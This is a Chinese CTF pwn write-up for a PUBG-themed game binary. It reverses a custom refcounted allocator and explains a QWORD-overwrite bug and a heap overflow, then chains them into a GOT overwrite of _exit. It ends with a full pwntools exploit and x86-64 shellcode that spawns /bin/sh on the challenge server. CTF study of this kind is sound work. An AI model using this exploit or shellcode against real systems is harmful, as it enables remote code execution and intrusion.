@@ -1,0 +1,310 @@
+# 前言
+这题真难啊，折腾我好久，我都把整个游戏逆出来了，结果最后发现根本不用全部逆出来，哈哈。。不过没事，当作练习逆向了。。哈哈。。。
+
+# 本题考点
+这道题我是没找到什么经典的缓冲区溢出啊格式化字符串啊double free啊UAF啊之类的洞。。。感觉我用的方法挺奇葩的。。。嗯。。。不知道跟大家用的方法一不一样。。。好了不废话了开始分析。。。
+
+# 逆向部分
+大概呢，就是作者自己mmap了一片内存，然后自己设计了一个chunk结构，然后申请内存空间都从这片mmap出来的内存申请。这个chunk结构的header有16字节，第二个一看就知道是chunk_size不说，关键是第一个，我一开始硬是没看出来这个QWORD是啥。。。
+```c
+_QWORD *__fastcall malloc_adjust(signed int a1)
+{
+  signed int v2; // [sp+Ch] [bp-4h]@3
+
+  if ( a1 >= 0 && a1 > 16 )                     // >16
+  {
+    if ( a1 <= 16 || a1 > 48 )                  // >48
+    {
+      if ( a1 <= 48 || a1 > 80 )                // >80
+        v2 = 400;                               // 80<x
+      else
+        v2 = 80;                                // 48<x<=80
+    }
+    else
+    {
+      v2 = 48;                                  // 16<size<=48
+    }
+  }
+  else
+  {
+    v2 = 16;                                    // x<=16
+  }
+  return malloc_(v2);
+}//这个malloc_adjust会根据输入调整一下实际分配的大小，就当他是对齐用的吧。。。
+```
+然后我们来看看game_start函数的部分代码(输入2 signup时)
+```c
+if ( v3 == 2 )
+{
+	puts("welcome to Playerunknown's Battlegrounds");
+	puts("First,you need set your username and password");
+	v1 = malloc_adjust(48);
+	dreflhs_rhs_withGC((_QWORD **)&sign_infor, v1);// collapse
+	puts("input your username");
+	getstr(sign_infor->username, 0x10LL);
+	puts("input your password");
+	getstr(sign_infor->password, 0x10LL);
+	puts("Second,you need create a character and give him a name");
+	v2 = malloc_adjust(56);
+	dreflhs_rhs_withGC((_QWORD **)&sign_infor->status, v2);
+	sign_infor->status->health = 100LL;
+	sign_infor->status->capacity = 100LL;
+	sign_infor->status->stamina = 100LL;
+	puts("input your character's name");
+	getstr(sign_infor->status->name, 0x10LL);
+	puts("all is ok");
+}
+```
+v1 malloc 之后，会调用一个叫做dreflhs_rhs_withGC的函数，这个函数我前面一直没看懂，硬是盯了好久，才发现这其实是 带GC的 \*参数1=参数2 的这么一个操作，所以chunk的第一个QWORD是一个类似引用计数的东西，我们跟进这个函数看看
+```c
+// *lhs=rhs
+_QWORD *__fastcall dreflhs_rhs_withGC(_QWORD **pointer, void *mem_frommymalloc)
+{
+  _QWORD *chunk_mem; // rax@2
+  _QWORD *chunk; // rax@4
+  _QWORD *result; // rax@5
+
+  if ( mem_frommymalloc )
+  {
+    chunk_mem = minus_16(mem_frommymalloc);
+    incre_ref(chunk_mem);
+  }
+  if ( *pointer )
+  {
+    chunk = minus_16(*pointer);
+    reduce_ref(chunk);                          // collapse
+  }
+  result = pointer;
+  *pointer = mem_frommymalloc;
+  return result;
+}
+__int64 __fastcall is_deref_a_inrange(_QWORD *a1)
+{
+  return *a1 <= 0x7FFFFFFFEFFFLL && *a1 > 0x400000LL;
+}
+_DWORD *__fastcall ret_addr_of_first_addr(_QWORD *chunk, signed __int64 *pi)
+{
+  signed __int64 i; // [sp+18h] [bp-18h]@3
+  signed __int64 size; // [sp+20h] [bp-10h]@3
+  _QWORD *mem; // [sp+28h] [bp-8h]@3
+
+  if ( !chunk )
+    exit(0);
+  mem = chunk + 2;
+  size = (chunk[1] - 16LL) / 8;
+  for ( i = *pi; i < size; ++i )
+  {
+    *pi = i;
+    if ( (unsigned __int8)is_deref_a_inrange(&mem[i]) )
+      return &mem[i];
+  }
+  return 0LL;
+}
+
+// also, reflect mem to chunk[2](data part)
+_QWORD *__fastcall rec_chunk(_QWORD *chunk)
+{
+  _QWORD *result; // rax@3
+
+  if ( !mem )
+    mem = malloc_adjust(4);
+  chunk[2] = mem;//任意chunk[2]可以被我们控制，会被赋值为mem的值，QWORD SHOOT here!!!
+  *mem = chunk;                        // 可能overflow，但我没用这个
+  result = mem + 1;
+  ++mem;
+  return result;
+}
+__int64 __fastcall reduce_ref(_QWORD *chunk)
+{
+  _QWORD *chunk_1; // rax@3
+  __int64 i; // [sp+10h] [bp-20h]@1
+  _QWORD *chunk_; // [sp+18h] [bp-18h]@1
+  _QWORD **p_elem; // [sp+20h] [bp-10h]@2
+  __int64 v6; // [sp+28h] [bp-8h]@1
+
+  v6 = *MK_FP(__FS__, 40LL);
+  i = 0LL;
+  chunk_ = chunk;
+  --*chunk;
+  if ( !*chunk_ )                               // 如果引用计数变成0
+  {
+    while ( 1 )
+    {
+      p_elem = (_QWORD **)ret_addr_of_first_addr(chunk, &i);
+      if ( p_elem == 0LL )                      // 如果在chunk中已经没有有效地址了
+        break;
+      ++i;                                      // 增加i并且做下次循环
+      chunk_1 = minus_16(*p_elem);              // 如果 *pmem 是有效地址(在指定范围中)，但不一定是在mmap的堆中, 也会把它当作mmap中的chunk，进行rec_chunk的调用
+      rec_chunk(chunk_1);                       // 它被当成了chunk，但不一定是mmap中的chunk(0x41414141-16)
+    }
+    rec_chunk(chunk_);
+  }
+  return *MK_FP(__FS__, 40LL) ^ v6;
+}
+```
+这个代码讲起来有些复杂，总之大概就是\*a1=a2，并且增加a2的计数，减少a1的计数，如果a1的计数变成0了，就以QWORD为单位遍历缓冲区里面的数，如果碰到在规定范围内的(\*a1 <= 0x7FFFFFFFEFFFLL && *a1 > 0x400000LL)，就对其进行处理，如rec_chunk函数所示。然而在这个范围内不一定是mmap中的地址，所以导致一个QWORD SHOOT，但是写入的数据只能是mem的值。
+喔，还有就是我逆出来的结构体，供大家参考
+```asm
+00000000 sign_info       struc ; (sizeof=0x30, mappedto_1)
+00000000 unknown         dq ?
+00000008 username        db 16 dup(?)
+00000018 password        db 16 dup(?)
+00000028 status          dq ?                    ; offset
+00000030 sign_info       ends
+00000030
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 char_status     struc ; (sizeof=0x38, mappedto_4)
+00000000 name            db 8 dup(?)
+00000008 unknown         dq ?
+00000010 health          dq ?
+00000018 stamina         dq ?
+00000020 capacity        dq ?
+00000028 location_       dq ?
+00000030 item_ll         dq ?                    ; offset
+00000038 char_status     ends
+00000038
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 item            struc ; (sizeof=0x28, mappedto_5)
+00000000 item_type       dq ?
+00000008 weight          dq ?
+00000010 num             dq ?
+00000018 next            dq ?                    ; offset
+00000020 some_num        dq ?
+00000028 item            ends
+00000028
+```
+# 漏洞触发
+所以什么时候会触发呢？就是sign第二次的时候，具体逻辑不说了。总之，如果前一个username转换成QWORD值时在范围内（\*a1 <= 0x7FFFFFFFEFFFLL && \*a1 > 0x400000LL）时，第二次sign就会导致[username]=mem。。。
+# 漏洞利用
+所以怎么利用呢？好的，[任意地址]=mem，而且mem还会自增，还会有其他有效地址被存入mem！(所以有可能破坏mem中的shellcode) 这咋一看没什么用啊！我这种菜鸟，就卡在这想了好久！
+最后根据我的不断实验，得出exploit方法:
+1. sign第一次 cheat_buf = mem
+2. sign第二次 \_exit GOT表 = mem, 这时前一个QWORD SHOOT执行
+3. sign第三次 username 为1，这时前一个QWORD SHOOT执行，GOT表被修改
+4. (PS:上面三个sign password和character's name都是1)
+5. 执行cheat，修改cheat里面的内存，其实这就是mem里面的内存！放置payload
+6. 调用\_exit，getshell!
+
+注：
+1. \_exit是我不断推敲得出来的，覆盖其他(getchar puts)的话，根本到不了放payload的cheat那里，因为这两个函数调用太频繁
+2. 然后很尴尬的是，程序没有\_exit的调用(主函数)，所以找\_exit的xref，发现唯一可能让他调用的是这里。。。
+```c
+int show_location()
+{
+  int result; // eax@2
+
+  switch ( sign_infor->status->location_ )
+  {
+    case 0LL:
+      result = puts("Your in a random location");
+      break;
+    case 1LL:
+      result = puts("Your in the Sosnovka military base");
+      break;
+    case 2LL:
+      result = puts("Your in the Sosnovka military base");
+      break;
+    case 3LL:
+      result = puts("Your in the Georgopol");
+      break;
+    case 4LL:
+      result = puts("Your in the Novorepnoye");
+      break;
+    case 5LL:
+      result = puts("Your in the Mylta Power");
+      break;
+    case 6LL:
+      result = puts("Your in the Primorsk");
+      break;
+    default:
+      puts("location error");
+      exit(0);
+      return result;
+  }
+  return result;
+}
+```
+所以找个方法，把sign\_infor->status->location_给污染了，就ok，实际上，如果动态跟一下的话，发现这个status就在cheat_buf的后面，而cheat有明显的溢出漏洞
+```c
+void cheat()
+{
+  if ( cheat_buf )
+  {
+    puts("content:");
+    getstr((char *)(cheat_buf + 16), 300LL);//overflow!!
+  }
+  else
+  {
+    cheat_buf = (__int64)malloc_adjust(48);
+    puts("name:");
+    getstr((char *)cheat_buf, 16LL);
+    puts("content:");
+    getstr((char *)(cheat_buf + 16), 32LL);
+  }
+}
+```
+300，够影响到status了，事实上，如果动态跟的话，我们会发现status的地址就在cheat_buf+0x98处（如果按照我都步骤做的话）。。。
+然后就是构造payload了。。。
+```python
+paddings = 0x98
+shellcode = "\x48\x8b\x1c\x25\x70\x50\x60\x00\x48\x81\xeb\xa0\xed\x03\x00\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xff\xd3\x90\x90\x90"
+payload = 'A'*8 + shellcode + 'A' * (paddings - 8 - len(shellcode)) + p64(0x605098)
+```
+前面8个'A'是因为_exit的实际会跳转到cheat_buf+8处执行，动态跟一下就知道了，然后说说最后的那个0x605098，反正只要满载p->location不在范围内就好，我随便找的一个.data的地址，这个好像是mmap_initial?不记得了，哪个都一样。。。
+shellcode基本上就是获取malloc函数地址，计算system地址，push (QWORD)"/bin/sh\\x00"(刚好是8字节，哈哈)，mov rdi,rsp, call system (伪代码，伪代码，请勿当真)
+所以最后exp
+
+```python
+from pwn import *
+g_local = False
+if g_local:
+	sh=process("./pwn")
+else:
+	sh=remote("123.206.22.95",8888)
+
+#pre: in the initial begin status
+#post: same as above
+def signup(szUsername, szPassword, szCharname):
+	global sh
+	sh.send("2\n")
+	sh.recvuntil("input your username\n")
+	sh.send(szUsername + '\n')
+	sh.recvuntil("input your password\n")
+	sh.send(szPassword + '\n')
+	sh.recvuntil("input your character's name\n")
+	sh.send(szCharname + '\n')
+	sh.recvuntil("2.Signup\n==============================\n")
+
+#pre: in the initial begin status, usernamepasword correct
+#post: game begin status
+def login(szUsername, szPassword):
+	global sh
+	sh.send("1\n")
+	sh.recvuntil("Input your username:\n")
+	sh.send(szUsername + '\n')
+	sh.recvuntil("Input your password:\n")
+	sh.send(szPassword + '\n')
+	sh.recvuntil("0.exit\n")
+
+#pre: game begin status
+#post: wo shuo shell ni xin bu?
+def cheat_set_payload(szPayload):
+	global sh
+	sh.send("5\n")
+	sh.recvuntil("content:\n")
+	sh.send(szPayload)
+	sh.interactive()
+
+signup("\xf0\x50\x60", "1", "1")
+signup("\x80\x50\x60", "1", "1")
+signup("1", "1", "1")
+login("1","1")
+
+paddings = 0x98
+shellcode = "\x48\x8b\x1c\x25\x70\x50\x60\x00\x48\x81\xeb\xa0\xed\x03\x00\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xff\xd3\x90\x90\x90"
+payload = 'A'*8 + shellcode + 'A' * (paddings - 8 - len(shellcode)) + p64(0x605098)
+
+cheat_set_payload(payload)
+```
